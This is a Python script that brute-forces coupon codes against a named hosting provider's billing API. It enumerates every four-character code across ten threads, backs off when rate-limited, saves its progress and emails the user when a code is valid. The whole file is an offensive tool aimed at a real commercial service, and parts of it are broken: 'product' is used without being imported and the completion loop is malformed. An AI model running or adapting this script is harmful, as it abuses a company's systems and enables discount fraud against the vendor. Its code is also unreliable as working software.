import requests
import pickle
import time
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from tqdm import tqdm  # For the progress bar
import smtplib  # For email notifications
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from blessed import Terminal  # For terminal manipulation

# -----------------------------
# Configuration and Constants
# -----------------------------

PROGRESS_FILE = "progress.pkl"
START_CODE = "AAAA"
END_CODE = "ZZZZ"
URL = "https://hpanel.hostinger.com/api/billing/api/v1/estimate/16CHlQUFlUXzQBLwK/plan-upgrade"
DATA_TEMPLATE = {"coupon_code": None}
CHARS = string.ascii_uppercase + string.digits  # 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
MAX_WORKERS = 10  # Number of concurrent threads
REQUEST_TIMEOUT = 5  # Seconds
RETRY_LIMIT = 5  # Number of retries for failed requests
DELAY_BETWEEN_REQUESTS = 1  # Seconds

# Email Notification Settings
EMAIL_FROM = "your_email@example.com"
EMAIL_TO = "recipient@example.com"
EMAIL_PASSWORD = "your_email_password"
SMTP_SERVER = "smtp.example.com"
SMTP_PORT = 587

# Initialize Blessed Terminal
term = Terminal()

# -----------------------------
# Logging Setup
# -----------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("brute_force.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# -----------------------------
# Thread-Safe Progress Management
# -----------------------------

lock = threading.Lock()

def load_progress(progress_file=PROGRESS_FILE):
    """
    Load the saved progress of the script.
    Returns the last tried coupon code.
    """
    try:
        with open(progress_file, "rb") as f:
            last_code = pickle.load(f)
            logger.info(f"Loaded progress. Last tested code: {last_code}")
            return last_code
    except (FileNotFoundError, EOFError, pickle.UnpicklingError):
        logger.info("No progress found. Starting from the initial code.")
        return START_CODE

def save_progress(current_code, progress_file=PROGRESS_FILE):
    """
    Save the current progress of the script.
    """
    with lock:
        with open(progress_file, "wb") as f:
            pickle.dump(current_code, f)
            logger.info(f"Progress saved. Current code: {current_code}")

# -----------------------------
# Coupon Code Generator
# -----------------------------

def generate_codes(start_code=START_CODE, end_code=END_CODE, length=None):
    """
    Generator that yields coupon codes from start_code to end_code.
    If length is specified, it generates codes of that length.
    """
    if length is not None:
        for code in product(CHARS, repeat=length):
            yield ''.join(code)
    else:
        current_code = list(start_code)
        end_code_list = list(end_code)
        while current_code <= end_code_list:
            yield ''.join(current_code)
            # Increment the code
            for i in reversed(range(len(current_code))):
                idx = CHARS.find(current_code[i]) + 1
                if idx < len(CHARS):
                    current_code[i] = CHARS[idx]
                    break
                else:
                    current_code[i] = CHARS[0]
            else:
                # All combinations have been exhausted
                return

# -----------------------------
# Coupon Code Checking Function
# -----------------------------

def check_coupon(coupon_code):
    """
    Check if the coupon code is valid.
    Returns True if valid, False otherwise.
    """
    data = {"coupon_code": coupon_code}
    headers = {
        "Content-Type": "application/json"
    }
    
    for attempt in range(1, RETRY_LIMIT + 1):
        try:
            response = requests.post(URL, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                logger.info(f"🎉 Valid coupon code found: {coupon_code}")
                return True
            elif response.status_code == 429:
                backoff = 2 ** attempt
                logger.warning(f"Rate limit hit. Sleeping for {backoff} seconds...")
                time.sleep(backoff)
            else:
                logger.debug(f"Invalid code: {coupon_code} (Status: {response.status_code})")
                return False
        except requests.exceptions.RequestException as e:
            backoff = 2 ** attempt
            logger.error(f"Error checking code {coupon_code}: {e}. Retrying in {backoff} seconds...")
            time.sleep(backoff)
    logger.error(f"Failed to check code {coupon_code} after {RETRY_LIMIT} attempts.")
    return False

# -----------------------------
# Notification System
# -----------------------------

def send_email_notification(coupon_code):
    """
    Send an email notification when a valid coupon code is found.
    """
    subject = "🎉 Valid Coupon Code Found!"
    body = f"A valid coupon code has been found: {coupon_code}"

    msg = MIMEMultipart()
    msg["From"] = EMAIL_FROM
    msg["To"] = EMAIL_TO
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_FROM, EMAIL_PASSWORD)
        server.sendmail(EMAIL_FROM, EMAIL_TO, msg.as_string())
        server.quit()
        logger.info("📧 Email notification sent successfully!")
    except Exception as e:
        logger.error(f"Failed to send email notification: {e}")

# -----------------------------
# Worker Function
# -----------------------------

def worker(coupon_code):
    """
    Worker function to check a single coupon code.
    """
    if check_coupon(coupon_code):
        # If a valid code is found, send an email notification
        send_email_notification(coupon_code)
    # Save progress after each attempt
    save_progress(coupon_code)
    time.sleep(DELAY_BETWEEN_REQUESTS)  # Delay to prevent rapid requests

# -----------------------------
# Dynamic Output Function with Blessed
# -----------------------------

def dynamic_output(lines, pbar):
    """
    Print a fixed number of lines and overwrite them dynamically using Blessed.
    """
    print(term.clear)  # Clear the screen
    for line in lines:
        print(line)
    pbar.refresh()  # Refresh the progress bar

# -----------------------------
# Main Function
# -----------------------------

def main():
    # Load the last tested code
    last_code = load_progress()

    # Create a generator starting from the next code after last_code
    def code_generator():
        gen = generate_codes()
        for code in gen:
            if code > last_code:
                yield code

    codes = code_generator()
    
    # Calculate total number of codes to test for the progress bar
    total_codes = sum(1 for _ in generate_codes())
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_code = {executor.submit(worker, code): code for code in list(next(codes) for _ in range(MAX_WORKERS))}
        print(term.clear)  # Clear the console and move cursor to the top

        try:
            with tqdm(total=total_codes, desc="Testing Coupons", unit="code") as pbar:
                output_lines = []
                while True:
                    completed, _ = as_completed(future_to_code), None
                    for future in completed:
                        code = future_to_code[future]
                        try:
                            future.result()
                        except Exception as e:
                            logger.error(f"Error in thread for code {code}: {e}")
                        # Submit the next code
                        try:
                            next_code = next(codes)
                            future_to_code[executor.submit(worker, next_code)] = next_code
                        except StopIteration:
                            logger.info("All coupon codes have been tested.")
                            break
                        # Update dynamic output
                        output_lines = [f"Testing code: {code}", f"Last valid code: {last_code}"]
                        dynamic_output(output_lines, pbar)
                        pbar.update(1)
        except KeyboardInterrupt:
            logger.info("Script interrupted by user. Saving progress and exiting...")
            executor.shutdown(wait=False)
            return

if __name__ == "__main__":
    main()